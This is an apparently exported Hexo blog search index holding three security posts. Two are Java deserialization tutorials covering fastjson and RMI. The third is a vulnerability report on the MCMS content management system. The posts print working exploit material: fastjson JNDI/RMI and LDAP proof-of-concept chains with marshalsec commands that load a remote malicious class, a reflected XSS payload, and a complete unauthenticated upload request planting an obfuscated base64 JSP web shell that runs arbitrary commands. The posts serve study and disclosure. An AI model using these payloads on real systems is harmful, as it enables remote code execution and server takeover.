<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Java反序列化-2(fastjson)</title>
    <url>/2021/11/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2-fastjson/</url>
    <content><![CDATA[<h2 id="fastjson基本使用"><a href="#fastjson基本使用" class="headerlink" title="fastjson基本使用"></a>fastjson基本使用</h2><p>首先就是新建一个maven项目，因为现在手头这台机子没装idea,就用vscode吧</p>
<p>包名为<code>com.fastjsonser</code></p>
<span id="more"></span>

<p>目录结构如下:</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636339894358-2021-11-810:51:34.png"></p>
<p>Person.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjsonser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>Ser.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjsonser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Ser</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        person.setName(<span class="string">&quot;harry&quot;</span>);</span><br><span class="line">        person.setAge(<span class="number">22</span>);</span><br><span class="line">        <span class="comment">// 调用了这个SerializerFeature.WriteClassName就会在json数据中生成一个@type，</span></span><br><span class="line">        <span class="comment">// 反序列化时就只需要parseObject就可以直接反序列化而不需要加上类型的指示</span></span><br><span class="line">        String jsonstring = JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(jsonstring);</span><br><span class="line">        <span class="comment">// unserialise</span></span><br><span class="line">        System.out.println(JSON.parse(jsonstring));</span><br><span class="line">        System.out.println(JSON.parseObject(jsonstring));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636340011716-2021-11-810:53:31.png"></p>
<p>可以看到因为parse没执行成功，parseObject执行成功了，因为parseObject会根据@type来自动转换对象成json</p>
<p>尝试在各个get.set中加入输出语句来方便观察调用的顺序和逻辑：</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636340731118-2021-11-811:05:31.png"></p>
<p>漏洞在于parse只会触发set方法，parseObject会触发get,set两种方法，这种特性导致了反序列化漏洞的发生，在get中构造恶意的代码会被自动的执行</p>
<h2 id="触发反序列化"><a href="#触发反序列化" class="headerlink" title="触发反序列化"></a>触发反序列化</h2><p>修改person类，往里面加入一个新的成员变量,<code>private String gender</code>并补全set,get方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getGender</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;call getgender&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> gender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setGender</span><span class="params">(String gender)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;call setgender&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.gender = gender;</span><br><span class="line">    <span class="comment">// 构造恶意语句，熟悉的Runtime类，这次不弹spotify了...</span></span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;gnome-calculator&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636341289534-2021-11-811:14:49.png"></p>
<p>弹了俩计算器并且set,get分别执行了两次，很好理解因为给</p>
<p>person赋值的时候调用了一次set,</p>
<p>toJSONString的时候调用了一次get</p>
<p>parseobject会分别调用一次set,get</p>
<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>记录一下poc</p>
<h3 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//JNDIServer.java</span></span><br><span class="line"><span class="keyword">package</span> com.fastjsonser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;Exploit&quot;</span>, <span class="string">&quot;com.fastjsonser.badClassName&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//JNDIClient.java</span></span><br><span class="line"><span class="keyword">package</span> com.fastjsonser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//badclassname.class</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">badClassName</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/usr/bin/gnome-calculator&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>基于RMI利用的JDK版本 ≤ 6u141、7u131、8u121，</p>
<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>运行<code>JNDIServer</code></p>
<p>在badclassname相同目下开启http服务</p>
<p>运行<code>JNDIClient</code></p>
<h3 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h3><p>只修改client的payload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>启动LDAPServer</p>
<h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><p>基于LDAP利用的JDK版本 ≤ 6u211、7u201、8u19</p>
<p>也可以用工具来进行利用</p>
<p><a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
<p>装有java8，使用<code>mvn clean package -DskipTests</code>编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#rmi服务器，rmi服务起在8088 恶意class在http://ip:8080/文件夹/#ExportObject </span><br><span class="line">#不加8088端口号 默认是1099</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:8080/文件夹/#ExportObject 8088</span><br><span class="line">#rmi服务器，rmi服务起在8088 恶意class在http://ip:8080/文件夹/#ExportObject </span><br><span class="line">#不加8088端口号 默认是1389</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:8080/文件夹/#ExportObject 8088</span><br></pre></td></tr></table></figure>

<p>同时恶意class文件的web服务还需要自己去起。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6633#toc-5">https://xz.aliyun.com/t/6633#toc-5</a></p>
<p><a href="https://drops.blbana.cc/2020/04/16/Fastjson-JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE/#Fastjson-JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE">https://drops.blbana.cc/2020/04/16/Fastjson-JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE/#Fastjson-JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE</a></p>
<p><a href="https://xz.aliyun.com/t/8979#toc-3">https://xz.aliyun.com/t/8979#toc-3</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>反序列化</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化(1)</title>
    <url>/2021/11/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/</url>
    <content><![CDATA[<h2 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: harry</span></span><br><span class="line"><span class="comment"> * @Date: 2021-11-04 19:09:14</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2021-11-04 19:22:01</span></span><br><span class="line"><span class="comment"> * @LastEditors: harry</span></span><br><span class="line"><span class="comment"> * @Description: edited by harry</span></span><br><span class="line"><span class="comment"> * @FilePath: /java_tmp/un_serializaable.java</span></span><br><span class="line"><span class="comment"> * @E-mail: lycshub@gmail.com</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个可序列化的类，该类必须实现 java.io.Serializable 接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CanSerializable</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String first_name;</span><br><span class="line">    <span class="keyword">public</span> String last_name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayhello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.first_name + <span class="string">&quot; &quot;</span> + <span class="keyword">this</span>.last_name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 自定义 readObject 方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// 执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行命令,windows弹计算机我就弹个spotify吧</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;spotify&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化/反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">un_serializaable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// 实例化一个可序列化对象</span></span><br><span class="line">        CanSerializable testClass = <span class="keyword">new</span> CanSerializable();</span><br><span class="line">        testClass.first_name = <span class="string">&quot;harry&quot;</span>;</span><br><span class="line">        testClass.last_name = <span class="string">&quot;smith&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="comment">// 将序列化后的对象写入到文件</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(testClass);</span><br><span class="line">        os.close();</span><br><span class="line">        fos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        CanSerializable obj = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// 从文件读取序列化的结果后进行反序列化</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        obj = (CanSerializable) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(obj.first_name);</span><br><span class="line">        System.out.println(obj.last_name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>反序列化必须有两个条件：</p>
<ol>
<li>该类必须实现 java.io.Serializable 接口</li>
<li>该类的所有属性必须是可序列化的</li>
</ol>
<p>windows弹个计算器，我就弹个spotify吧</p>
<span id="more"></span>

<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/2021-11-04_21-10-2021-11-421:11:28.png"></p>
<h2 id="Java-RMI调用及其漏洞"><a href="#Java-RMI调用及其漏洞" class="headerlink" title="Java RMI调用及其漏洞"></a>Java RMI调用及其漏洞</h2><p>RMI就是远程调用，RMI（Remote Method Invocation）：一种用于实现远程过程调用的应用程序编程接口，常见的两种接口实现为 JRMP（Java Remote Message Protocol ，Java 远程消息交换协议）以及 CORBA。</p>
<p>实现的具体方式就是通过服务端注册Server然后由客户端调用,demo实现如下</p>
<p>目录结构</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636030069762-2021-11-420:47:49.png"></p>
<p>RMIServer.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> service.impl.HelloImpl;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="comment">//RMI服务端，用于把本机信息绑定到服务端并且注册服务</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String name = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        Hello hello = <span class="keyword">new</span> HelloImpl();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成存根（Stub）</span></span><br><span class="line">        UnicastRemoteObject.exportObject(hello, <span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建本机 1099 端口上的 RMI registry</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对象绑定到注册表中</span></span><br><span class="line">        registry.rebind(name, hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMIClient.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">//客户端，接收用户输入</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获取远程主机上的注册表</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        String name = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取远程对象</span></span><br><span class="line">        Hello hello = (Hello) registry.lookup(name);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            Scanner sc = <span class="keyword">new</span> Scanner(System.in); <span class="comment">// 读取输入</span></span><br><span class="line">            String message = sc.next();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用远程方法</span></span><br><span class="line">            hello.echo(message);</span><br><span class="line">            <span class="keyword">if</span> (message.equals(<span class="string">&quot;quit&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// sc.close();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Hello.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">echo</span><span class="params">(String message)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>helloImpl.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> service.impl;</span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="comment">//实现hello类的接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">implements</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">echo</span><span class="params">(String message)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">	<span class="comment">//如果用户输入quit就关闭服务器RMIServer</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;quit&quot;</span>.equalsIgnoreCase(message.toString()))&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;Server will be shutdown!&quot;</span>);</span><br><span class="line">		System.exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//非quit的字符直接打印在终端</span></span><br><span class="line">	System.out.println(<span class="string">&quot;Message from client: &quot;</span> + message);</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;Server response:&quot;</span> + message;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>往<code>RMIClient</code>命令行输入字符</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636029696988-2021-11-420:41:37.png"></p>
<p>RMIServer收到消息</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/image-20211104204551849-2021-11-420:46:24.png"></p>
<p>demo结束</p>
<h3 id="和反序列化有什么关系？"><a href="#和反序列化有什么关系？" class="headerlink" title="和反序列化有什么关系？"></a>和反序列化有什么关系？</h3><p>因为RMI 在传输数据的时候，会将数据序列化，在传输完成后再进行反序列化。客户端提供构造好的恶意数据，服务器端接收后进行反序列化触发代码执行。</p>
<ul>
<li>能够进行 RMI 通信</li>
<li>服务器引用第三方存在反序列化漏洞的包</li>
</ul>
<p>挖个坑，之后研究下RMI的反序列化</p>
<p>参考师傅的文章<a href="https://jckling.github.io/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/">Jckling’s Blog</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>MCMS vulnerabilities</title>
    <url>/2021/12/28/MCMS-vulnerabilities/</url>
    <content><![CDATA[<p>An open source  CMS Project,<a href="https://github.com/ming-soft/MCMS">https://github.com/ming-soft/MCMS</a>  </p>
<p>the  MCMS vulnerabilities include </p>
<ul>
<li>Reflect XSS</li>
<li>Unauthorized file upload</li>
<li>Authorized file delete</li>
</ul>
<span id="more"></span>

<h2 id="Reproduce"><a href="#Reproduce" class="headerlink" title="Reproduce"></a>Reproduce</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>path <code>/ms/template/unzip.do</code> exist reflect xss</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640674036583-2021-12-2814:47:16.png"></p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ms/template/unZip.do?fileUrl=%3C/p%3E%3Cimg%20src=x%20onerror=alert(%27hacking%27)%3E</span><br></pre></td></tr></table></figure>



<h3 id="Authorized-file-upload-to-RCE"><a href="#Authorized-file-upload-to-RCE" class="headerlink" title="Authorized file upload to RCE"></a>Authorized file upload to RCE</h3><p>Authorized file uploads exist </p>
<p>path <code>/ms/file/uploadTemplate.do</code></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640674695100-2021-12-2814:58:15.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640674447313-2021-12-2814:54:07.png"></p>
<p>need login get Cookie and upload file</p>
<h3 id="Unauthorized-file-upload-to-RCE"><a href="#Unauthorized-file-upload-to-RCE" class="headerlink" title="Unauthorized file upload to RCE"></a>Unauthorized file upload to RCE</h3><p>path <code>/file/upload</code></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640674792504-2021-12-2814:59:52.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640674556372-2021-12-2814:55:56.png"></p>
<p>as above picture ,hacker can upload <code>.jspx</code> file to server without any identity verification , <strong>and even when project packaged war deploy in tomcat can get web shell from server.</strong> </p>
<blockquote>
<p>the system filter suffix <code>.jsp</code> but still can  use <code>.jspx</code> to bypass </p>
</blockquote>
<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /file/upload.do HTTP/1.1</span><br><span class="line">Host: 192.168.100.103:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------124088951720288539841514905041</span><br><span class="line">Content-Length: 1393</span><br><span class="line">Origin: http://192.168.100.103:8080</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">-----------------------------124088951720288539841514905041</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploadPath&quot;</span><br><span class="line"></span><br><span class="line">/</span><br><span class="line">-----------------------------124088951720288539841514905041</span><br><span class="line">Content-Disposition: form-data; name=&quot;isRename&quot;</span><br><span class="line"></span><br><span class="line">false</span><br><span class="line">-----------------------------124088951720288539841514905041</span><br><span class="line">Content-Disposition: form-data; name=&quot;appId&quot;</span><br><span class="line"></span><br><span class="line">false</span><br><span class="line">-----------------------------124088951720288539841514905041</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.jspx&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;sun.misc.BASE64Decoder&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">if(request.getParameter(&quot;cmd&quot;)!=null)&#123;</span><br><span class="line">    BASE64Decoder decoder = new BASE64Decoder();</span><br><span class="line">    Class rt = Class.forName(new String(decoder.decodeBuffer(&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;)));</span><br><span class="line">    Process e = (Process)</span><br><span class="line">            rt.getMethod(new String(decoder.decodeBuffer(&quot;ZXhlYw==&quot;)), String.class).invoke(rt.getMethod(new</span><br><span class="line">                    String(decoder.decodeBuffer(&quot;Z2V0UnVudGltZQ==&quot;))).invoke(null, new</span><br><span class="line">                    Object[]&#123;&#125;), request.getParameter(&quot;cmd&quot;) );</span><br><span class="line">    java.io.InputStream in = e.getInputStream();</span><br><span class="line">    int a = -1;</span><br><span class="line">    byte[] b = new byte[2048];</span><br><span class="line">    out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">    while((a=in.read(b))!=-1)&#123;</span><br><span class="line">        out.println(new String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line">-----------------------------124088951720288539841514905041--</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="source"><a href="#source" class="headerlink" title="source"></a>source</h4><p><code>net/mingsoft/basic/action/ManageFileAction.java</code></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640675058416-2021-12-2815:04:18.png"></p>
